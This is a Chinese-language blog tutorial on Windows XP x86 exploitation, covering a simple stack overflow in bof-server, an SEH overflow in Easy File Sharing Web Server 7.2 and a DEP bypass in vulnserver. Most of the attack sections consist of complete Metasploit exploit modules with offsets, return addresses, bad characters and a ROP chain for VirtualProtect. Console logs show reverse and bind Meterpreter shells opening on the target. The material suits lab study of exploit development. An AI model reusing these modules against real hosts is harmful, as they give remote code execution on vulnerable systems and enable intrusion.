---
title: x86-basic 漏洞利用
date: 2019-07-10 17:00:36
tags:
- 二进制
- Windows
- 漏洞
categories: Pwn二进制漏洞
---
这部分是对Window x86平台下的几个典型漏洞利用方式的介绍，从最基础的、没有开启任何保护的漏洞程序入手，然后开启GS，最后通过rop绕过DEP。

---------------

# 0x00 漏洞利用开发简介
（1）需要什么
- Immunity Debugger -[Download](http://debugger.immunityinc.com/ID_register.py)
- Mona.py -[Download](https://github.com/corelan/mona)
- Metasploit框架-[下载](https://www.metasploit.com/)
- 靶机–Windows XP sp3

![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562741903/%E6%8D%95%E8%8E%B7.png)
- 函数调用与栈：调用、返回
- 寄存器与函数栈帧：ESP、EBP
- 函数栈帧：局部变量、栈帧状态值、函数返回地址
- 函数调用约定与相关指令：参数传递方式、参数入栈顺序、恢复堆栈平衡的操作

（2）函数调用的汇编过程
1. 示例程序
```cpp
charname[] = "1234567";
voidfunc(int a, int b, int c)
{
    charbuf[8];
    strcpy(buf, name);
}
```
2. 汇编过程
* PUSH c, PUSH b, PUSH a
* CALL address of func【保存返回地址；跳转】
* MOV ebp, esp
* PUSH ebp
* SUB esp, 0x40
* 创建局部变量，4个字节为一组
* do something
* add esp, 0x40
* pop ebp
* RETN【弹出返回地址，跳转】
3. 栈帧结构
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742079/%E6%8D%95%E8%8E%B71.png)

# 0x01 简单栈溢出

> **目标程序:**
> [bof-server source code](http://redstack.net/blog/static/uploads/2008/01/bof-server.c)
> [bof-server binary for Windows](http://redstack.net/blog/wp-content/uploads/2008/01/bof-server.exe)
> **usage:**
> 服务端
> `bof-server.exe 4242`
> 客户端
> `telnet localhost 4242`
> `version`
> `bof-server v0.01`
> `quit`

## 漏洞点
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742316/%E5%9B%BE%E7%89%871.png)

**产生崩溃**
将输出的1024个A发送给靶机程序
```
python -c "print('A' * 1024)"
telnet 192.168.64.138 4242
```
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742366/%E5%9B%BE%E7%89%872.png)

## 关闭防御措施
使用**PESecurity**检查可执行文件本身的防御措施开启情况
注意设置：Set-ExecutionPolicyUnrestricted

![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742444/%E5%9B%BE%E7%89%873.png)

**ASLR和DEP**
ASLR在xp下不用考虑，DEP可通过修改boot.ini中的nonexecute来完成（AlwaysOff、OptOut）
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742486/%E5%9B%BE%E7%89%874.png)

## 整体的攻击流程
1. 任意非00的指令覆盖buffer和EBP
2. 从程序已经加载的dll中获取他们的jmp esp指令地址。
3. 使用jmp esp的指令地址覆盖ReturnAddress
4. 从下一行开始填充Shellcode
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742543/%E5%9B%BE%E7%89%875.png)

## 确定溢出点的位置
1. 生成字符序列 **pattern_create.rb**
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742622/%E5%9B%BE%E7%89%876.png)

2. 发送给目标程序
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742623/%E5%9B%BE%E7%89%877.png)

3. 计算偏移量 **pattern_offset.rb**
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742685/%E5%9B%BE%E7%89%878.png)

4. 确定payload结构
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742686/%E5%9B%BE%E7%89%879.png)

## 寻找jmp esp跳板
1. OD附加进程看一下服务器加载了哪些模块
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742794/%E5%9B%BE%E7%89%8710.png)
2. 查找JMP ESP指令的地址
在这里选择了ws2_32.dll作为对象，通过Metasploit的msfbinscan进行搜索
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562742793/%E5%9B%BE%E7%89%8711.png)

## 自动化攻击
```ruby=
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
  super(update_info(info,
    'Name' 		=> 'Stack Based Buffer Overflow Example',
    'Description' 	=> %q{
      			    Stack Based Overflow Example Application Exploitation Module
    			   },
    'Platform' 		=> 'Windows',
    'Author' 		=> 'yanhan',

    'Payload' 		=>
      			   {
        		   'space' => 400,
                           'BadChars' => "\x00\xff"
                      	   },
    'Targets'  		=>
      			   [
        		     [
			      'Windows XP SP3',
			      {'Ret' => 0x71a22b53, 'Offset' => 520}
			     ]
      			   ],
     'DisclosureDate' => '2019-05-25'
  ))
  end

  def exploit
    connect
    buf = make_nops(target['Offset'])
    buf = buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded
    sock.put(buf)
    handler
    disconnect
   end
end
```
```
msf5 > use exploit/windows/yanhan/bof_attack
msf5 exploit(windows/yanhan/bof_attack) > set rhosts 192.168.31.114
rhosts => 192.168.31.114
msf5 exploit(windows/yanhan/bof_attack) > set rport 1000
rport => 1000
msf5 exploit(windows/yanhan/bof_attack) > exploit

[*] Started reverse TCP handler on 192.168.31.84:4444
[*] Sending stage (179779 bytes) to 192.168.31.114
[*] Meterpreter session 1 opened (192.168.31.84:4444 -> 192.168.31.114:1062) at 2019-07-10 16:38:51 +0800

meterpreter > ls
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40555/r-xr-xr-x   0        dir   2019-05-14 09:54:43 +0800  Application Data
40777/rwxrwxrwx   0        dir   2019-05-14 09:54:43 +0800  Cookies
40555/r-xr-xr-x   0        dir   2019-05-14 09:54:43 +0800  Favorites
40777/rwxrwxrwx   0        dir   2019-05-14 09:54:43 +0800  Local Settings
40555/r-xr-xr-x   0        dir   2019-05-14 09:54:43 +0800  My Documents
100666/rw-rw-rw-  1048576  fil   2019-05-14 09:54:43 +0800  NTUSER.DAT
40777/rwxrwxrwx   0        dir   2019-05-14 09:54:43 +0800  NetHood
40777/rwxrwxrwx   0        dir   2019-05-14 09:54:43 +0800  PrintHood
40555/r-xr-xr-x   0        dir   2019-05-14 09:54:43 +0800  Recent
40555/r-xr-xr-x   0        dir   2019-05-14 09:54:43 +0800  SendTo
40777/rwxrwxrwx   0        dir   2019-05-14 09:54:43 +0800  Templates
100777/rwxrwxrwx  26665    fil   2019-05-28 14:59:10 +0800  bof-server.exe
100666/rw-rw-rw-  1024     fil   2019-05-14 09:54:43 +0800  ntuser.dat.LOG
100666/rw-rw-rw-  178      fil   2019-05-14 09:54:43 +0800  ntuser.ini
40777/rwxrwxrwx   0        dir   2019-05-29 10:49:26 +0800  vulnserver
40555/r-xr-xr-x   0        dir   2019-05-14 09:54:43 +0800  「开始」菜单
40777/rwxrwxrwx   0        dir   2019-05-14 09:54:43 +0800  桌面

meterpreter >

```

------------

# 0x02 基于SEH的栈溢出

> **目标程序** Easy File Sharing Web Server 7.2
>
> **漏洞点**
> 在处理请求时存在漏洞——一个恶意的请求头部（HEAD或GET）就可以引起缓冲区溢出，从而改写SEH链的地址。
>
> **利用seh**
> 填充物+nseh+ seh（pop popretn指令序列地址）+shellcode
>
> ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562744120/11.png)

## 确定溢出点的位置
1. 生成字符序列
```
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 10000 > a.txt
python -c "print(' HTTP/1.0\r\n\r\n')" > b.txt
cat a.txt b.txt > c.txt
```
删除cat造成的多余字符0x0a
```
vim -bz.txt
# In Vim
:%!xxd
# After editing, use the instruction below to save
:%!xxd -r
```

2. 构造SEH链
- 将Easy File Sharing Web Server 7.2加载到ImmunityDebugger中，并处于运行状态。
- 发送溢出字符序列
- 查看Easy File Sharing Web Server 7.2溢出地址
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562744240/231.png)

3. 计算偏移量
计算catch块偏移量&计算下一条SEH记录偏移量

## 寻找PPR
1. 使用mona寻找
需要POP/POP/RET指令的地址来载入下一条SEH记录的地址，并跳转到攻击载荷
```
!mona modules
!mona seh
```

## 自动化攻击
1. 编写攻击脚本
```ruby=
require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Easy File Sharing HTTP Server 7.2 SEH Overflow',
      'Description'     => %q{
        This Module Demonstrate SEH based overflow example
      },
      'Author'          => 'yanhan',

      'Payload'         =>
        	{
          		'Space'       => 390,
          		'BadChars'    => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e"
        	},
      'Platform'      => 'Windows',
      'Targets'       =>
         		 [
            		   [
              		   'Easy File Sharing 7.2 HTTP',
              			{
                		'Ret'       => 0x10022fd7,
                		'Offset'    => 4061
              			}
            		   ]
          		 ],
      'DisclosureDate'  => '2019-01-16',
  ))
  end

  def exploit
    connect
    weapon = "HEAD "
    weapon << make_nops(target['Offset'])
    weapon << generate_seh_record(target['Ret'])
    weapon << make_nops(20)
    weapon << payload.encoded
    weapon << " HTTP/1.0\r\n\r\n"
    sock.put(weapon)
    handler
    disconnect
   end
end
```


2. exploit
```
msf5 > use exploit/windows/yanhan/seh_attack
msf5 exploit(windows/yanhan/seh_attack) > set rhosts 192.168.31.114
rhosts => 192.168.31.114
msf5 exploit(windows/yanhan/seh_attack) > set rport 80
rport => 80
msf5 exploit(windows/yanhan/seh_attack) > exploit

[*] Started reverse TCP handler on 192.168.31.84:4444
[*] Exploit completed, but no session was created.
msf5 exploit(windows/yanhan/seh_attack) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf5 exploit(windows/yanhan/seh_attack) > exploit

[*] Started bind TCP handler against 192.168.31.114:4444
[*] Sending stage (179779 bytes) to 192.168.31.114
[*] Meterpreter session 1 opened (192.168.31.84:46601 -> 192.168.31.114:4444) at 2019-07-10 16:43:47 +0800

meterpreter > getuid
Server username: WHU-3E3EECEBFD1\Administrator
```


-------------

# 0x03 绕过DEP

> **目标程序** [Introducing Vulnserver](http://www.thegreycorner.com/2010/12/introducing-vulnserver.html)
> **使用** vulnserver.exe 6666
> **漏洞点** ![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562744461/%E5%9B%BE%E7%89%8712.png)

## 设置DEP保护
![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1562744518/%E6%8D%9511%E8%8E%B7.png)
*构建ROP链来调用VirtualProtect()关闭DEP并执行Shellcode*

## 计算偏移量
``'TRUN .'+make_nops(target['Offset'])``
Immunity附加进程之后，在服务端发送3000个字符，计算偏移

## 创建ROP链
`!mona rop -m *.dll -cp nonull`
```ruby
################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    [
      0x77dabf34,  # POP ECX # RETN [ADVAPI32.dll]
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x77d1927f,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]
      0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll]
      0x77bef671,  # POP EBP # RETN [msvcrt.dll]
      0x625011af,  # & jmp esp [essfunc.dll]
      0x77e9ad22,  # POP EAX # RETN [RPCRT4.dll]
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77e6c784,  # NEG EAX # RETN [RPCRT4.dll]
      0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll]
      0x7c87fbcb,  # POP EAX # RETN [kernel32.dll]
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77d4493b,  # NEG EAX # RETN [USER32.dll]
      0x77c28fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll]
      0x77bef7c9,  # POP ECX # RETN [msvcrt.dll]
      0x7c99bac1,  # &Writable location [ntdll.dll]
      0x719e4870,  # POP EDI # RETN [mswsock.dll]
      0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]
      0x77e8c50c,  # POP EAX # RETN [RPCRT4.dll]
      0x90909090,  # nop
      0x77de60c7,  # PUSHAD # RETN [ADVAPI32.dll]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()
```
## 自动化攻击
```ruby=
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DEP Bypass Exploit',
      'Description'    => %q{
        		  DEP Bypass Using ROP Chains Example Module
      			  },
      'Platform'       => 'Windows',
      'Author'         => 'yanhan',
      'Payload'        =>
        		  {
          		  'space'     => 312,
          		  'BadChars'  => "\x00"
        		  },
      'Targets'        =>
      		  	  [
          		    [
			    'Windows XP',
			    {'Offset'  => find it}
			    ]
        		  ],
      'DisclosureDate' => '2019-01-16'))
  end

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    [
      0x77dabf34,  # POP ECX # RETN [ADVAPI32.dll]
      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
      0x77d1927f,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]
      0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll]
      0x77bef671,  # POP EBP # RETN [msvcrt.dll]
      0x625011af,  # & jmp esp [essfunc.dll]
      0x77e9ad22,  # POP EAX # RETN [RPCRT4.dll]
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77e6c784,  # NEG EAX # RETN [RPCRT4.dll]
      0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll]
      0x7c87fbcb,  # POP EAX # RETN [kernel32.dll]
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77d4493b,  # NEG EAX # RETN [USER32.dll]
      0x77c28fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll]
      0x77bef7c9,  # POP ECX # RETN [msvcrt.dll]
      0x7c99bac1,  # &Writable location [ntdll.dll]
      0x719e4870,  # POP EDI # RETN [mswsock.dll]
      0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]
      0x77e8c50c,  # POP EAX # RETN [RPCRT4.dll]
      0x90909090,  # nop
      0x77de60c7,  # PUSHAD # RETN [ADVAPI32.dll]
    ].flatten.pack("V*")

    return rop_gadgets
  end


  def exploit
    connect
    rop_chain = create_rop_chain()
    junk = make_nops(target['Offset'])
    buf = "TRUN ." + junk + rop_chain + make_nops(16) + payload.encoded + '\r\n'
    sock.put(buf)
    handler
    disconnect
  end
end
```

```
msf5 > use exploit/windows/yanhan/rop_attack
msf5 exploit(windows/yanhan/rop_attack) > set rhosts 192.168.31.114
rhosts => 192.168.31.114
msf5 exploit(windows/yanhan/rop_attack) > set rport 1000
rport => 1000
msf5 exploit(windows/yanhan/rop_attack) > exploit

[*] Started reverse TCP handler on 192.168.31.84:4444
[*] Exploit completed, but no session was created.
msf5 exploit(windows/yanhan/rop_attack) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf5 exploit(windows/yanhan/rop_attack) > exploit

[*] Started bind TCP handler against 192.168.31.114:4444
[*] Exploit completed, but no session was created.
msf5 exploit(windows/yanhan/rop_attack) > exploit

[*] Started bind TCP handler against 192.168.31.114:4444
[*] Sending stage (179779 bytes) to 192.168.31.114
[*] Meterpreter session 1 opened (192.168.31.84:44537 -> 192.168.31.114:4444) at 2019-07-10 16:51:07 +0800

meterpreter > getuid
Server username: WHU-3E3EECEBFD1\Administrator
```
